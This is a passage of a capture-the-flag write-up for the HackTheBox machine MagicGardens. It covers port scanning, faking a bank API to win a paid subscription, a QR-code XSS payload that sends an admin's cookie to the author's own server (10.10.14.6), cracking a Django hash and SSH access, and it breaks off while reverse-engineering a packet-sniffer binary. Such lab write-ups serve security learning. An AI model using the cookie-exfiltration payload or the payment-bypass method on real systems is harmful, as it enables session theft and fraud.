---
title: HTB: MagicGardens
url: https://0xdf.gitlab.io/2025/02/08/htb-magicgardens.html
date: 2025-02-08T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, htb-magicgardens, hackthebox, nmap, docker-registry, django, feroxbuster, python, flask, qrcode, qrcode-xss, xss, hashcat, ghidra, bof, arbitrary-write, ipv4, ipv6, pattern-create, htpasswd, dockerregistrygrabber, deserialization, pickle, django-deserialization, django-pickle, cap-sys-module, kernel-module, htb-registrytwo, htb-developer
---

![MagicGardens](/img/magicgardens-cover.png)

MagicGardens starts by exploiting a Django website, tricking it into approving a purchase for a premium subscription. With this subscription, I am able to include a cross-site scripting payload in a QRCode and collect the admin’s cookie. This provides access to the Django admin panel where I’ll get a hash and SSH access to the box. Another user is running custom network monitoring software. I’ll exploit a buffer overflow in the IPv6 handler to get a shell as that user. That user has access to the Docker Registry, where I’ll find the image for the container running the Django site, including the hardcoded secret. I’ll exploit a deserialization vulnerability to get a root shell in that container. From there, I’ll abuse the capability to load kernel modules to get a root shell on the box.

## Box Info

| Name | [MagicGardens](https://hackthebox.com/machines/magicgardens)  [MagicGardens](https://hackthebox.com/machines/magicgardens) [Play on HackTheBox](https://hackthebox.com/machines/magicgardens) |
| --- | --- |
| Release Date | [18 May 2024](https://twitter.com/hackthebox_eu/status/1791136561737699340) |
| Retire Date | 08 Feb 2025 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for MagicGardens |
| Radar Graph | Radar chart for MagicGardens |
| First Blood User | 02:27:33[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 02:27:16[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [m4rsh3ll m4rsh3ll](https://app.hackthebox.com/users/286072) |

## Recon

### nmap

`nmap` finds four open TCP ports, SSH (22), HTTP (80), something maybe DNS related on 1337, and Docker Registry (5000). SMTP (25) is filtered as well.

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:25 EST
Nmap scan report for magicgardens.htb (10.10.11.9)
Host is up (0.085s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
25/tcp   filtered smtp
80/tcp   open     http
1337/tcp open     waste
5000/tcp open     upnp

Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
oxdf@hacky$ nmap -p 22,80,1337,5000 -sCV 10.10.11.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:31 EST
Nmap scan report for magicgardens.htb (10.10.11.9)
Host is up (0.085s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
|_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
80/tcp   open  http     nginx 1.22.1
|_http-title: Magic Gardens
|_http-server-header: nginx/1.22.1
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
|_    [x] Handshake error
5000/tcp open  ssl/http Docker Registry (API: 2.0)
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-05-23T11:57:43
|_Not valid after:  2024-05-22T11:57:43
|_http-title: Site doesn't have a title.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=2/1%Time=679E767D%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\[x
SF:\]\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x20
SF:error\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPCCh
SF:eck,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"\[
SF:x\]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(Ter
SF:minalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15,"
SF:\[x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0")%
SF:r(LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,15,
SF:"\[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshake\
SF:x20error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")%r
SF:(NCP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%r(
SF:ms-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Hands
SF:hake\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.46 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 12 bookworm.

The TLS certificate on 5000 doesn’t show a domain name.

### Docker Registry - TCP 5000

I’ve enumerated Docker Registry a couple times before, and go into details about the API in my post on [RegistryTwo](/2024/02/03/htb-registrytwo.html#docker-registry---tcp-5000--5001). Port 5000 shows the standard empty response on `/`:

```

HTTP/2 200 OK
Cache-Control: no-cache
Content-Length: 0
Date: Sat, 01 Feb 2025 20:11:09 GMT

```

Trying to visit the `/v2/` endpoint returns a message saying I need auth to continue:

```

oxdf@hacky$ curl -k https://magicgardens.htb:5000/v2/
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}

```

This is the response for an HTTP 401, asking for HTTP basic auth. Without creds, not much else to do here.

### TCP 1337

I’ll try to interact with the unknown service on 1337. `curl` shows that it’s not HTTP/HTTPS:

```

oxdf@hacky$ curl magicgardens.htb:1337
curl: (1) Received HTTP/0.9 when not allowed
oxdf@hacky$ curl -k https://magicgardens.htb:1337
curl: (35) OpenSSL/3.0.13: error:0A00010B:SSL routines::wrong version number

```

Connecting with `nc` hangs, and on entering something and hitting enter, replies with an error and exits:

```

oxdf@hacky$ nc magicgardens.htb 1337
qweqweqweqwe
[x] Handshake error

```

Will have to come back to this once I understand more about it.

### Website - TCP 80

#### Site

Visiting the site by IP address redirects to `magicgardens.htb`. I’ll do a quick brute force for subdomains that respond differently but not find any. I’ll add this to my `/etc/hosts` file:

```
10.10.11.9 magicgardens.htb

```

The site is for a flower shop:

![image-20250201151918716](/img/image-20250201151918716.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s a view to see individual items:

![image-20250201155831914](/img/image-20250201155831914.png)

There is a signin page and it allows for registration. After creating an account and signing in, there’s a message at the top right:

![image-20250201171138151](/img/image-20250201171138151.png)

On my profile, there’s a few pages I can update:

![image-20250201171216958](/img/image-20250201171216958.png)

The messages page shows no messages:

![image-20250202065128426](/img/image-20250202065128426.png)

I can create one, but I don’t know who to send to:

![image-20250202065148860](/img/image-20250202065148860.png)

The Subscription page has an offer to upgrade:

![image-20250201171248878](/img/image-20250201171248878.png)

It costs $25:

![image-20250201171304497](/img/image-20250201171304497.png)

If I fill that out and submit, it returns:

![image-20250201171343284](/img/image-20250201171343284.png)

Refreshing shows it failed:

![image-20250201171410617](/img/image-20250201171410617.png)

#### Tech Stack

The HTTP response headers show nothing interesting besides nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 01 Feb 2025 22:12:36 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 31244

```

The 404 page shows the [Python Django framework default 404](/cheatsheets/404#django) page:

![image-20250201173036346](/img/image-20250201173036346.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://magicgardens.htb --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://magicgardens.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       21w      179c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        0l        0w        0c http://magicgardens.htb/admin => http://magicgardens.htb/admin/
200      GET      458l     1853w    30861c http://magicgardens.htb/
301      GET        0l        0w        0c http://magicgardens.htb/register => http://magicgardens.htb/register/
301      GET        0l        0w        0c http://magicgardens.htb/logout => http://magicgardens.htb/logout/
301      GET        0l        0w        0c http://magicgardens.htb/search => http://magicgardens.htb/search/
301      GET        0l        0w        0c http://magicgardens.htb/login => http://magicgardens.htb/login/
301      GET        0l        0w        0c http://magicgardens.htb/catalog => http://magicgardens.htb/catalog/
...[snip]...

```

I typically `--dont-follow-links` as it mostly returns a bunch of images and CSS. `feroxbuster` does find `/admin`, which confirms this site is Django:

![image-20250201174056326](/img/image-20250201174056326.png)

## Shell as morty

### Get Subscription

#### Request Analysis

When I try to pay for a subscription, there’s a POST request to `/subscribe/` that looks like:

```

POST /subscribe/ HTTP/1.1
Host: magicgardens.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://magicgardens.htb/profile/?tab=subscription&action=upgrade
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Origin: http://magicgardens.htb
Cookie: csrftoken=UJawGZQ4cAD1IVh3TrTYjwwmODpw7Tzl; sessionid=.eJxrYJ2axQABtVM0ejhKi1OL8hJzU6f0sBhUpKRN6WErLkksKS2e0sMRXJKYl5JYlDKlh7M8szgjPiezuGRKD8OUHh4wNzm_NK8ktWhKBlsPZ3JiUQlEHsjjAfMQ0qV6AIlUK3Q:1teLkj:YK6d_IOBZ0uwTvcVhh36iuHavKePNsjBQwlgdKOICkE

csrfmiddlewaretoken=9sKpVDmnNKNMs2Bki5xvd4d3zd1ddcNqT1KLrs2hPagD0NId1mgjmqzfdGgzaVcB&bank=honestbank.htb&cardname=0xdf&cardnumber=1111-2222-3333-4444&expmonth=September&expyear=2026&cvv=420

```

In addition to the card name and number, expiration, and cvv, there’s a `bank` field with the value `honestbank.htb`. That comes from the bank I select here:

![image-20250201174839148](/img/image-20250201174839148.png)

The three options are `honestbank.htb`, `magicalbank.htb`, and `plunders.htb`:

![image-20250201174945142](/img/image-20250201174945142.png)

Adding these to my `hosts` file and trying to visit them just returns 404.

#### Bank API

To understand the bank APIs, I’ll send the request to `/subscribe/` to Burp Repeater and change the `bank` parameter to my IP. On sending, an HTTP request arrives at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.9 49908
POST /api/payments/ HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 129
Content-Type: application/json

{"cardname": "0xdf", "cardnumber": "1111-2222-3333-4444", "expmonth": "September", "expyear": "2026", "cvv": "420", "amount": 25}

```

So when I try to pay, it sends a request to `/api/payments/` at the bank using the Python `requests` module.

I’ll try sending this same request to see what the response looks like:

```

oxdf@hacky$ curl honestbank.htb/api/payments/ -d '{"cardname": "0xdf", "cardnumber": "1111-2222-3333-4444", "expmonth": "September", "expyear": "2026", "cvv": "420", "amount": 25}'
{"status": "402", "message": "Payment Required", "cardname": "0xdf", "cardnumber": "1111-2222-3333-4444"}

```

It’s JSON with four fields. The last two are just mirroring what was sent. The first two are the HTTP status code of the response:

```

oxdf@hacky$ curl -v honestbank.htb/api/payments/ -d '{"cardname": "0xdf", "cardnumber": "1111-2222-3333-4444", "expmonth": "September", "expyear": "2026", "cvv": "420", "amount": 25}'
* Host honestbank.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.9
*   Trying 10.10.11.9:80...
* Connected to honestbank.htb (10.10.11.9) port 80
> POST /api/payments/ HTTP/1.1
> Host: honestbank.htb
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 129
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 402 Payment Required
< Server: nginx/1.22.1
< Date: Sun, 02 Feb 2025 11:31:20 GMT
< Content-Type: application/json
< Content-Length: 105
< Connection: keep-alive
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< Referrer-Policy: same-origin
< Cross-Origin-Opener-Policy: same-origin
< 
* Connection #0 to host honestbank.htb left intact
{"status": "402", "message": "Payment Required", "cardname": "0xdf", "cardnumber": "1111-2222-3333-4444"}

```

#### Fake Bank

I’ll write a simple Flask script that will return success when hit on `/api/payments/`:

```

from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/payments/", methods=["POST"])
def payments():
    data = request.get_json()
    response = {
        "status": "200",
        "message": "OK",
        "cardname": data["cardname"],
        "cardnumber": data["cardnumber"],
    }
    return jsonify(response)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")

```

I could fake this with `nc` and raw data, but this app is so simple to write (and ChatGPT can do it as well).

I’ll run it, and turn on interception in Burp Proxy. I’ll submit the payment request, and change the bank to the IP / port of my server, `10.10.14.6:5000`. On sending that, there’s a request at my Flask app:

```

oxdf@hacky$ python fake_bank.py 
 * Serving Flask app 'fake_bank'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://10.0.2.7:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 521-979-635
10.10.11.9 - - [02/Feb/2025 06:38:23] "POST /api/payments/ HTTP/1.1" 200 -

```

After refreshing the page, I’ve got a premium subscription:

![image-20250202064131012](/img/image-20250202064131012.png)

### Admin Access

#### QRCode Analysis

The QRcode I’m given decodes to three values joined by period:

```

oxdf@hacky$ zbarimg qrcode.png 
QR-Code:465e929fc1e0853025faad58fc8cb47d.0d341bcdc6746f1d452b3f4de32357b9.0xdf
scanned 1 barcode symbols from 1 images in 0.04 seconds

```

The last one is my username. The first one is the MD5 of my username:

```

oxdf@hacky$ echo -n "0xdf" | md5sum
465e929fc1e0853025faad58fc8cb47d  -

```

It’s not clear what the middle one is.

#### Messages

When I complete a purchase as a premium subscriber, I get a message:

![image-20250202065308806](/img/image-20250202065308806.png)

I can send the QRcode, but doesn’t seem to do anything.

#### XSS

It’s possible that Morty is going to scan the QRCode with some system that will display it’s validity. The username is included, which suggests that might be displayed back as well. If that’s the case, it’s possible that raw HTML in the QRcode could be rendered, providing a XSS opportunity.

To test this, I’ll include an image tag in a QRcode:

```

oxdf@hacky$ qrencode -o xss-img.png '465e929fc1e0853025faad58fc8cb47d.0d341bcdc6746f1d452b3f4de32357b9.0xdf<img src="http://10.10.14.6/img" />'

```

When I send this to morty, less than a minute later I get a hit on my server:

```
10.10.11.9 - - [02/Feb/2025 07:02:16] code 404, message File not found
10.10.11.9 - - [02/Feb/2025 07:02:16] "GET /img HTTP/1.1" 404 -

```

I’ll note that the cookies on this site are not `HttpOnly`:

![image-20250202070753242](/img/image-20250202070753242.png)

That means I can exfil morty’s cookie. I’ll write a POC to write a script tag and have it exfil the cookie through an image tag:

```

oxdf@hacky$ qrencode -o xss-poc.png '465e929fc1e0853025faad58fc8cb47d.0d341bcdc6746f1d452b3f4de32357b9.0xdf<script>img=new Image(); img.src="http://10.10.14.6/?c=" + document.cookie;</script>'

```

Shortly after sending this, I get a hit:

```
10.10.11.9 - - [02/Feb/2025 10:43:03] "GET /?c=csrftoken=gs5PGLZyqUt4cwgOZu6s2iJfnv6Bxo04;%20sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tec94:pgxZ_OL42x44OoYBHLKHdXAWlvtbt3iGgv9vvUnP9GM HTTP/1.1" 200 -

```

#### morty Session

I’ll replace my cookies in the browser dev tools with the exfiled ones, and the browser shows a session as morty:

![image-20250202113113600](/img/image-20250202113113600.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

When I view one of the messages, it has an option to check the QR code:

![image-20250202113152188](/img/image-20250202113152188.png)

Clicking that shows information about the user (this one is benign):

![image-20250202113209256](/img/image-20250202113209256.png)

### Recover Password

#### Admin Panel

Logged in a morty, I’ll try to access the Django admin panel at `/admin/`, and it works:

![image-20250202113325152](/img/image-20250202113325152.png)

Under Users –> morty it shows an obfuscated hash for their password:

![image-20250202113421728](/img/image-20250202113421728.png)

Under “Store users”, morty is also there, this time with a full hash:

![image-20250202113503126](/img/image-20250202113503126.png)

Nothing to exploit here, but it does show how the XSS worked.

#### Hashcat

I’ll save that hash to a file, and pass it to `hashcat`:

```

$ hashcat morty.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10000 | Django (PBKDF2-SHA256) | Framework
...[snip]...
$ hashcat morty.hash --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10000 | Django (PBKDF2-SHA256) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers

```

### SSH

The password works to SSH as morty:

```

oxdf@hacky$ sshpass -p 'jonasbrothers' ssh morty@magicgardens.htb
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
morty@magicgardens:~$

```

## Shell as alex

### Enumeration

#### Users

morty’s home directory doesn’t have much in it. There’s a `bot` folder that has a Python script that triggers the XSS, but doesn’t have anything useful going forward.

There’s one other user with a home directory in `/home`, alex:

```

morty@magicgardens:/home$ ls
alex  morty

```

This matches the users with shells set in `/etc/passwd`:

```

morty@magicgardens:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
morty:x:1001:1001::/home/morty:/bin/bash

```

#### Processes

The alex user is running a process called `harvest`:

```

morty@magicgardens:/$ ps auxww | grep alex
alex        1760  0.0  0.2  18968 10664 ?        Ss   Feb01   0:00 /lib/systemd/systemd --user
alex        1761  0.0  0.0 168264  3084 ?        S    Feb01   0:00 (sd-pam)
alex        1780  0.0  0.0   2464   908 ?        S    Feb01   0:00 harvest server -l /home/alex/.harvest_logs
root        4073  0.0  0.2  17392 10884 ?        Ss   Feb01   0:00 sshd: alex [priv]
alex        4079  0.0  0.1  17652  6624 ?        S    Feb01   0:00 sshd: alex@pts/0
alex        4080  0.0  0.0   7196  3912 pts/0    Ss   Feb01   0:00 -bash

```

`harvest` is running without a full path, so it’s likely in the alex user’s path. It’s in morty’s as well:

```

morty@magicgardens:/$ which harvest
/usr/local/bin/harvest

```

I’ll copy the binary back with `scp`:

```

oxdf@hacky$ sshpass -p 'jonasbrothers' scp morty@magicgardens.htb:/usr/local/bin/harvest .

```

### Harvest Analysis

#### File Information

`file` isn’t installed on MagicGardens, but on my machine it shows this is a 64-bit Linux ELF executable:

```

oxdf@hacky$ file harvest 
harvest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=13667f92f8314f1b726e07ce96dd2a4fad06df7f, for GNU/Linux 3.2.0, not stripped

```

[VirusTotal](https://www.virustotal.com/gui/file/6cd751ad33c74578b4c3171741afcac1e170ba1b3a9c97cad0265d1a9fe8d125/details) shows it was first uploaded on 29 May 2024, about two weeks after MagicGarden’s release:

![image-20250202144030429](/img/image-20250202144030429.png)

That means it’s very likely this is custom development for MagicGardens.

#### Running It

Running the file provides a help (after some ASCII art):

```

oxdf@hacky$ ./harvest 

 ██░ ██  ▄▄▄       ██▀███   ██▒   █▓▓█████   ██████ ▄▄▄█████▓
▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒
▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒ ▓██  █▒░▒███   ░ ▓██▄   ▒ ▓██░ ▒░
░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ 
░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒▒██████▒▒  ▒██▒ ░ 
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░░ ░▒  ░ ░    ░    
 ░  ░░ ░  ░   ▒     ░░   ░      ░░     ░   ░  ░  ░    ░      
 ░  ░  ░      ░  ░   ░           ░     ░  ░      ░           
                                ░                            

harvest v1.0.3 - Remote network analyzer

Usage: harvest <command> [options...]

Commands:
    server          run harvest in server mode
    client          run harvest in client mode

Options:
    -h              show this message
    -l <file>       log file
    -i <interface>  capture packets on this interface

Example:
    harvest server -i eth0
    harvest client 10.10.15.212

Please, define mode

```

Running it in server mode just starts it with a listening message and hangs:

```

oxdf@hacky$ sudo ./harvest server -i tun0
[*] Listening on interface tun0

```

If in another terminal I start a client, it starts dumping data:

```

oxdf@hacky$ ./harvest client 10.10.14.6
[*] Connection to 10.10.14.6 1337 port succeeded
[*] Successful handshake
g--------------------------------------------------
Source: [08:00:27:99:9c:61]     [10.0.2.7]
Dest:   [52:54:00:12:35:02]     [152.96.15.4]
Time:   [14:42:40]      Length: [0]
--------------------------------------------------
Source: [08:00:27:99:9c:61]     [10.0.2.7]
Dest:   [52:54:00:12:35:02]     [152.96.15.4]
Time:   [14:42:40]      Length: [0]
--------------------------------------------------
Source: [08:00:27:99:9c:61]     [10.0.2.7]
Dest:   [52:54:00:12:35:02]     [23.106.56.133]
Time:   [14:42:40]      Length: [0]
--------------------------------------------------
Source: [52:54:00:12:35:02]     [23.106.56.133]
Dest:   [08:00:27:99:9c:61]     [10.0.2.7]
Time:   [14:42:40]      Length: [39]
--------------------------------------------------
...[snip]...

```

It seems to be dumping metadata about all packets that the server is seeing (even on other interfaces). It’s connecting on TCP 1337, which is also open on MagicGardens. It works there too:

```

oxdf@hacky$ ./harvest client 10.10.11.9
[*] Connection to 10.10.11.9 1337 port succeeded  
[*] Successful handshake

```

It just hangs, and eventually prints some localhost data. If I then enter a command into my SSH session, my IP shows up:

```

...[snip]...
--------------------------------------------------
Source: [00:50:56:b9:70:e2]     [10.10.14.6]      
Dest:   [00:50:56:b9:e9:18]     [10.10.11.9]      
Time:   [14:45:37]      Length: [86]              
--------------------------------------------------
Source: [00:50:56:b9:e9:18]     [10.10.11.9]      
Dest:   [00:50:56:b9:70:e2]     [10.10.14.6]      
Time:   [14:45:37]      Length: [86]              
--------------------------------------------------
Source: [00:50:56:b9:70:e2]     [10.10.14.6]      
Dest:   [00:50:56:b9:e9:18]     [10.10.11.9]      
Time:   [14:45:37]      Length: [86]              
--------------------------------------------------
Source: [00:50:56:b9:e9:18]     [10.10.11.9]      
Dest:   [00:50:56:b9:70:e2]     [10.10.14.6]      
Time:   [14:45:37]      Length: [86]              
--------------------------------------------------
Source: [00:50:56:b9:70:e2]     [10.10.14.6]
Dest:   [00:50:56:b9:e9:18]     [10.10.11.9]
Time:   [14:45:37]      Length: [86]
--------------------------------------------------
Source: [00:50:56:b9:70:e2]     [10.10.14.6]
Dest:   [00:50:56:b9:e9:18]     [10.10.11.9]
Time:   [14:45:37]      Length: [86]
--------------------------------------------------
...[snip]...

```

If I take a look in Wireshark while connecting to the server on MagicGardens, I’ll see the client sends the string “harvest v1.0.3”, to which the server replies with the same, and then starts sending data:

![image-20250202150120328](/img/image-20250202150120328.png)

#### Reversing

I’ll open the binary in Ghidra and take a look. The `main` function just parses the args, printing the usage if anything is not right, and then calls either the `harvest_server` or `harvest_client` functions based on that input:

```

int main(int argc,long argv)

{
  int res;
  char *other_args [3];
  char *mode;
  int parse_args_ret;
  
  parse_args(other_args,argc,argv);
  if (parse_args_ret != 0) {
    print_usage();
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  res = strcmp(mode,"server");
  if (res == 0) {
    harvest_server(other_args);
  }
  else {
    harvest_client(other_args);
  }
  return 0;
}

```

`harvest_client` has nicely named functions that show what it does:

```

 void harvest_client(char **param_1)
 
 {
   int socket_id;
   
   socket_id = harvest_connect(param_1[1],*(uint *)(param_1 + 2));
   harvest_handshake_client(socket_id,*param_1);
   harvest_read(socket_id);
   return;
 }

```

It connects based on the input parameters, does the handshake (sending the “harvest 1.0.3” string shown above), and then reads from the socket and prints to stdout. Nothing too exciting there.

`harvest_server` is also very simple:

```

void harvest_server(char **param_1)

{
  signal(0xd,(__sighandler_t)&DAT_00000001);
  harvest_listen(*(uint *)(param_1 + 2),*param_1,param_1[4],param_1[6]);
  return;
}

```

It sets a handler for signal 0xd which is `SIGPIPE` for a broken pipe, and then calls `harvest_listen`. This function handles setting up the listening socket, and then calls `handle_connections`. Digging down a bit further, there are functions that handle client connection and the handshake, as well as a `handle_raw_packets` function.

`handle_raw_packets` get the sniffed packet and parses it:

```

void handle_raw_packets(int param_1,char *param_2,char *param_3)

{
  ssize_t pkt_len;
  char *time_str;
  char time_str_out [8];
  undefined uStack_10072;
  time_t timestamp;
  char src_mac [32];
  char dst_mac [32];
  byte packet_buffer [65566];
  
  memset(packet_buffer,0,0xffff);
  pkt_len = recvfrom(param_1,packet_buffer,0xffff,0,(sockaddr *)0x0,(socklen_t *)0x0);
  timestamp = time((time_t *)0x0);
  time_str = ctime(&timestamp);
  strncpy(time_str_out,time_str + 0xb,8);
  uStack_10072 = 0;
  if ((uint)pkt_len < 0x28) {
    puts("Incomplete packet ");
    close(param_1);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  sprintf(dst_mac,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",(ulong)packet_buffer[6],(ulong)packet_buffer[7],
          (ulong)packet_buffer[8],(ulong)packet_buffer[9],(ulong)packet_buffer[10],
          (ulong)packet_buffer[0xb]);
  sprintf(src_mac,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",(ulong)packet_buffer[0],(ulong)packet_buffer[1],
          (ulong)packet_buffer[2],(ulong)packet_buffer[3],(ulong)packet_buffer[4],
          (ulong)packet_buffer[5]);
  if (packet_buffer[0xe] == 0x45) {
    print_packet((long)(packet_buffer + 0xe),param_3,param_2,dst_mac,src_mac,time_str_out,
                 (long)packet_buffer);
  }
  if (packet_buffer[0xe] == 0x60) {
    log_packet((long)(packet_buffer + 0xe),param_3);
  }
  return;
}

```

There’s a branch checking the packet at offset 14 (0xe), which is the payload of the [Ethernet frame](https://en.wikipedia.org/wiki/Ethernet_frame):

![img](/img/magicgardens-700px-Ethernet_Type_II_Frame_format.svg.png)

The first byte of the IP packet (both IPv4 and IPv6) is the four bit version. Checking for 0x45 and 0x60 are a simplified check for IPv4 vs IPv6.

The IPv4 function, `print_packet` is pretty boring:

```

undefined8
print_packet(long param_1,undefined8 param_2,char *param_3,undefined8 param_4,undefined8 param_5,
            undefined8 param_6,long param_7)

{
  sprintf(param_3,
